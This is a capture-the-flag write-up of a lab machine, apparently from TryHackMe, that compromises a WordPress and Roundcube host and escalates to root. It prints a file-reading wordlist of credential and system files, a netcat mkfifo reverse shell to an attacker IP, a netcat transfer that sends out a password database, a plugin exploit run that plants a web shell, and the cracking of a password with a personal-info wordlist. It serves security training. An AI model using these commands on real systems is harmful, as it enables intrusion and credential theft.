
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---

Let's start by adding `mountaineer.thm` to `/etc/hosts`:

```bash
echo 'IP mountaineer.thm' | sudo tee -a /etc/hosts
```


![Pasted image 20250722171226.png](../../IMAGES/Pasted%20image%2020250722171226.png)

Let's fuzz:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://mountaineer.thm/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mountaineer.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

wordpress               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 178ms]
```

We got a WordPress installation here, let's check it up:

![Pasted image 20250722171231.png](../../IMAGES/Pasted%20image%2020250722171231.png)

Since this is a WordPress site, we can use `wpscan`:

```bash
wpscan --url http://mountaineer.thm/wordpress -e cb,u,dbe,ap
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://mountaineer.thm/wordpress/ [10.10.136.33]
[+] Started: Tue Jul 22 20:43:25 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.18.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://mountaineer.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://mountaineer.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://mountaineer.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://mountaineer.thm/wordpress/?feed=rss2, <generator>https://wordpress.org/?v=6.4.3</generator>
 |  - http://mountaineer.thm/wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.4.3</generator>

[+] WordPress theme in use: blogarise
 | Location: http://mountaineer.thm/wordpress/wp-content/themes/blogarise/
 | Last Updated: 2025-07-21T00:00:00.000Z
 | Readme: http://mountaineer.thm/wordpress/wp-content/themes/blogarise/readme.txt
 | [!] The version is out of date, the latest version is 1.2.5
 | Style URL: http://mountaineer.thm/wordpress/wp-content/themes/blogarise/style.css?ver=6.4.3
 | Style Name: BlogArise
 | Style URI: https://themeansar.com/free-themes/blogarise/
 | Description: BlogArise is a fast, clean, modern-looking Best Responsive News Magazine WordPress theme. The theme ...
 | Author: Themeansar
 | Author URI: http://themeansar.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 0.55 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://mountaineer.thm/wordpress/wp-content/themes/blogarise/style.css?ver=6.4.3, Match: 'Version: 0.55'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] modern-events-calendar-lite
 | Location: http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/
 | Last Updated: 2022-05-10T21:06:00.000Z
 | [!] The version is out of date, the latest version is 6.5.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.16.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/readme.txt
 | Confirmed By: Change Log (Aggressive Detection)
 |  - http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/changelog.txt, Match: '5.16.2'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <=========================================================================================================================> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:02 <===============================================================================================================================> (75 / 75) 100.00% Time: 00:00:02

[i] No DB Exports Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <==========================================================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] ChoOyu
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Everest
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] MontBlanc
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] everest
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] montblanc
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] chooyu
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] k2
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

We can find some users and also the plugin the page is using, this site is using:

```
modern-events-calendar-lite 5.16.2
```

If we search for an exploit regarding this version, we can find this:

![Pasted image 20250722171239.png](../../IMAGES/Pasted%20image%2020250722171239.png)

We got `RCE` on this version, the issue is we need to be authenticated:

![Pasted image 20250722171244.png](../../IMAGES/Pasted%20image%2020250722171244.png)

Let's save the exploit for now in case we get some credentials:

https://www.exploit-db.com/exploits/50082

Let's try to fuzz again to check any hidden stuff that may help us getting credentials:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://mountaineer.thm/wordpress/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mountaineer.thm/wordpress/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 248ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 269ms]
Duration: 329ms]
wp-content              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 181ms]
wp-login.php            [Status: 200, Size: 6486, Words: 270, Lines: 102, Duration: 233ms]
license.txt             [Status: 200, Size: 19915, Words: 3331, Lines: 385, Duration: 180ms]
wp-includes             [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 178ms]
readme.html             [Status: 200, Size: 7399, Words: 750, Lines: 98, Duration: 178ms]
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 238ms]
wp-admin                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 178ms]
```

If we try to go to `images`, we get a `403` status code:

![Pasted image 20250722171252.png](../../IMAGES/Pasted%20image%2020250722171252.png)

Analyzing the request on a proxy, we can notice that if we go to `images` instead of `images/`, we get a `301` status code:

![Pasted image 20250722171255.png](../../IMAGES/Pasted%20image%2020250722171255.png)

If we do some research on `nginx` exploitation, we can find there's LFI through misconfigured NGINX alias, we can find this:

![Pasted image 20250722171259.png](../../IMAGES/Pasted%20image%2020250722171259.png)

https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/

We can try `/images../file` to check if LFI exists:

![Pasted image 20250722171303.png](../../IMAGES/Pasted%20image%2020250722171303.png)

LFI indeed exists on this server, let's begin exploitation.


# EXPLOITATION
---

We got LFI and we're working on a `nginx` server, let's build a simple wordlist containing configuration files locations and other files that may help us:

```bash
/etc/nginx/nginx.conf
/etc/nginx/fastcgi_params
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default
/etc/nginx/conf.d/default.conf
/etc/nginx/mime.types
/var/www/html/index.php
/var/www/html/wp-config.php
/var/www/html/.env
/var/www/html/config.php
/var/www/html/db.php
/var/www/html/settings.php
/usr/share/nginx/html/index.html
/usr/share/nginx/html/index.php
/usr/share/nginx/html/wp-config.php
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/php7.4-fpm.log
/var/log/php8.1-fpm.log
/var/log/nginx/default.access.log
/var/log/nginx/default.error.log
/etc/php/7.4/fpm/php.ini
/etc/php/8.1/fpm/php.ini
/etc/php/7.4/fpm/pool.d/www.conf
/etc/php/8.1/fpm/pool.d/www.conf
/var/www/html/.env
/home/everest/.bash_history
/home/everest/.ssh/id_rsa
/home/everest/.ssh/authorized_keys
/etc/mysql/my.cnf
/root/.mysql_history
/etc/crontab
/etc/cron.d/php
/etc/cron.d/root
/var/spool/cron/crontabs/root
/etc/passwd
/etc/group
/etc/hosts
/etc/hostname
/etc/resolv.conf
/proc/self/environ
/proc/self/status
/proc/self/cmdline
```

After we send the attack, we can see some files get `200` status code:

![Pasted image 20250722171312.png](../../IMAGES/Pasted%20image%2020250722171312.png)


If we check `/etc/nginx/sites-available/default`, we can find this:


![Pasted image 20250722171315.png](../../IMAGES/Pasted%20image%2020250722171315.png)

There's a Vhost on here:

```
adminroundcubemail.mountaineer.thm
```

We can also see the `mysql` configuration file:

![Pasted image 20250722171320.png](../../IMAGES/Pasted%20image%2020250722171320.png)

Unfortunately, we can't access the file through the LFI vulnerability as we get a `403`, let's add the Vhost and check it up:

![Pasted image 20250722171325.png](../../IMAGES/Pasted%20image%2020250722171325.png)


This is running `roundcube webmail 1.5.3`, we know this by checking the source code:

```js
rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10503,
```

![Pasted image 20250722171331.png](../../IMAGES/Pasted%20image%2020250722171331.png)

Nothing too important on here, if we try some basic credentials based on the usernames we found on `wpscan`, we can access the mail with:

```
k2:k2
```


![Pasted image 20250722171336.png](../../IMAGES/Pasted%20image%2020250722171336.png)


We got two emails:

![Pasted image 20250722171341.png](../../IMAGES/Pasted%20image%2020250722171341.png)

![Pasted image 20250722171344.png](../../IMAGES/Pasted%20image%2020250722171344.png)

We've also sent an email:

![Pasted image 20250722171348.png](../../IMAGES/Pasted%20image%2020250722171348.png)

We got a password and some info about `lhotse`, if we try the following credentials on WordPress, we get access to the panel:

```
k2 / th3_tall3st_password_in_th3_world
```


![Pasted image 20250722171356.png](../../IMAGES/Pasted%20image%2020250722171356.png)


![Pasted image 20250722171359.png](../../IMAGES/Pasted%20image%2020250722171359.png)


Credentials work, remember the exploit where we got RCE but we needed authentication?

Time to use it then, let's download the script:

```
https://www.exploit-db.com/download/50082
```

Let's use it:

```python
python3 exploit.py -h

  ______     _______     ____   ___ ____  _      ____  _  _   _ _  _  ____
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | || || ___|
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | || ||___ \
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |__   _|__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|  |_||____/

                * Wordpress Plugin Modern Events Calendar Lite RCE                              
                * @Hacker5preme



usage: exploit.py [-h] [-T IP] [-P PORT] [-U PATH] [-u USERNAME] [-p PASSWORD]

Wordpress Plugin Modern Events Calenar Lite RCE (Authenticated)

options:
  -h, --help            show this help message and exit
  -T, --IP IP
  -P, --PORT PORT
  -U, --PATH PATH
  -u, --USERNAME USERNAME
  -p, --PASSWORD PASSWORD
```

```python
python3 exploit.py -T mountaineer.thm -P 80 -U /wordpress/ -u k2 -p th3_tall3st_password_in_th3_world


  ______     _______     ____   ___ ____  _      ____  _  _   _ _  _  ____
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | || || ___|
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | || ||___ \
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |__   _|__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|  |_||____/

                * Wordpress Plugin Modern Events Calendar Lite RCE                              
                * @Hacker5preme





[+] Authentication successfull !

[+] Shell Uploaded to: http://mountaineer.thm:80/wordpress//wp-content/uploads/shell.php
```

Let's go see the shell:

![Pasted image 20250722171405.png](../../IMAGES/Pasted%20image%2020250722171405.png)

We got a `p0wny` shell, let's confirm `rce`:

![Pasted image 20250722171413.png](../../IMAGES/Pasted%20image%2020250722171413.png)

Time to send ourselves a reverse shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc IP 4444 >/tmp/f
```

![Pasted image 20250722171418.png](../../IMAGES/Pasted%20image%2020250722171418.png)

I'll use `pwncat` as my listener to catch persistence in case my listener bugs:

```
pwncat -l --self-inject /bin/bash:10.14.21.28:4444 4444
```

![Pasted image 20250722171422.png](../../IMAGES/Pasted%20image%2020250722171422.png)

Let's begin privilege escalation.

# PRIVILEGE ESCALATION
---

We can make our session better with:

```bash
export TERM=xterm
export BASH=bash
```

Let's use `linpeas` to check any important info:

![Pasted image 20250722171431.png](../../IMAGES/Pasted%20image%2020250722171431.png)

We got a keepass file inside of `lhotse` home, we can also find this:

![Pasted image 20250722171435.png](../../IMAGES/Pasted%20image%2020250722171435.png)

We can't read files inside of `kangchenjunga` home, we can read the `ToDo.txt` file though:

```
www-data@mountaineer:/tmp$ cat /home/nanga/ToDo.txt
cat /home/nanga/ToDo.txt
Just a gentle reminder to myself:

Even though K2 isn't fond of presents, I can't help but want to get him something special! I'll make sure to mark it on my calendar to pick out a little surprise for him by this weekend.

After all, his birthday may be several months away, but every day with him feels like a celebration of love!!!!
```

Python doesn't exist on the machine, we can transfer the file with netcat:

```bash
# On our machine:
nc -lvnp 1111 > backup.kdbx
# On the reverse shell
nc OUR_VPN_IP 1111 < /home/lhotse/Backup.kdbx
```

The file is encrypted with a password:

![Pasted image 20250722171439.png](../../IMAGES/Pasted%20image%2020250722171439.png)

We need to use john to crack it, although, in order to accomplish this, we'll need to craft a custom wordlist containing `lhotse` information, remember the mail we got with his info, we'll use that with `cupp`:

First, let's convert the file into john format with `keepass2john`:

```
keepass2john backup.kdbx > hash
```

Now, its time to use `cupp`, you can clone it from here in case you don't have the tool:

```
git clone https://github.com/Mebus/cupp.git
```

Time to use it:

```python
python3 cupp.py -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Mount
> Surname: Lhotse
> Nickname: MrSecurity
> Birthdate (DDMMYYYY): 18051956


> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name: Lhotsy
> Company name: BestMountainsInc


> Do you want to add some key words about the victim? Y/[N]: N
> Do you want to add special chars at the end of words? Y/[N]: N
> Do you want to add some random numbers at the end of words? Y/[N]:N
> Leet mode? (i.e. leet = 1337) Y/[N]: N

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to mount.txt, counting 2214 words.
> Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with mount.txt and shoot! Good luck!
```

Time to use our wordlist with the hash on john:

```bash
john hash --wordlist=mount.txt

Lhotse56185      (backup)
```

We got the password for our file, let's use it and check the file, we can use `keepassxc`:

![Pasted image 20250722171504.png](../../IMAGES/Pasted%20image%2020250722171504.png)

We can notice kangchenjunga on here, we can now read the password for this user:

![Pasted image 20250722171508.png](../../IMAGES/Pasted%20image%2020250722171508.png)

```
kangchenjunga / J9f4z7tQlqsPhbf2nlaekD5vzn4yBfpdwUdawmtV
```

We can now go into ssh:

![Pasted image 20250722171512.png](../../IMAGES/Pasted%20image%2020250722171512.png)

Time to read those files:

```bash
kangchenjunga@mountaineer:~$ cat local.txt
97a805eb710deb97342a48092876df22

kangchenjunga@mountaineer:~$ cat mynotes.txt
Those my notes:

1. Tell root stop using my account ! It's annoying !
2. Travel to Mars sometime, I heard there are great mountains there !
3. Make my password even harder to crack ! I don't want anyone to hack me !
```

First one is the user flag, what really is interesting here is the `mynotes.txt` file, specially this part:

```bash
1. Tell root stop using my account ! It's annoying !
```

This part hints that we may be able to find root password inside of the `.bash_history` of `kangchenjunga`, let's check:

```bash
kangchenjunga@mountaineer:~$ cat .bash_history
ls
cd /var/www/html
nano index.html
cat /etc/passwd
ps aux
suroot
th3_r00t_of_4LL_mount41NSSSSssssss
whoami
ls -la
cd /root
ls
mkdir test
cd test
touch file1.txt
mv file1.txt ../
cd ..
rm -rf test
exit
ls
cat mynotes.txt
ls
cat .bash_history
cat .bash_history
ls -la
cat .bash_history
exit
bash
exit
```

That's right, we got the root password `th3_r00t_of_4LL_mount41NSSSSssssss`, let's go into root and end the CTF:

```
kangchenjunga@mountaineer:~$ su root
Password:
root@mountaineer:/home/kangchenjunga# whoami
root
```

![Pasted image 20250722171521.png](../../IMAGES/Pasted%20image%2020250722171521.png)

```
root@mountaineer:/home/kangchenjunga# cat /root/root.txt
a41824310a621855d9ed507f29eed757

root@mountaineer:/home/kangchenjunga# cat /root/note.txt
Dear Adventurers,

I want to express my heartfelt thanks for embarking on this incredible journey to explore the highest mountains with us. Your participation has made this adventure in the wilderness even more remarkable.

As we ascended these towering peaks, we not only embraced the natural challenges but also celebrated the majestic beauty of the highest mountains on our planet. Your spirit of adventure and shared passion for mountaineering have truly enriched this experience.

Thank you for being a part of this remarkable expedition, which has been a tribute to the mightiest mountains and the thrill of reaching new heights.

With sincere gratitude,

The mountaineer

p.s.

This machine was created while climbing ;)
```

Final flags are:

```
97a805eb710deb97342a48092876df22

a41824310a621855d9ed507f29eed757
```

![Pasted image 20250722171526.png](../../IMAGES/Pasted%20image%2020250722171526.png)

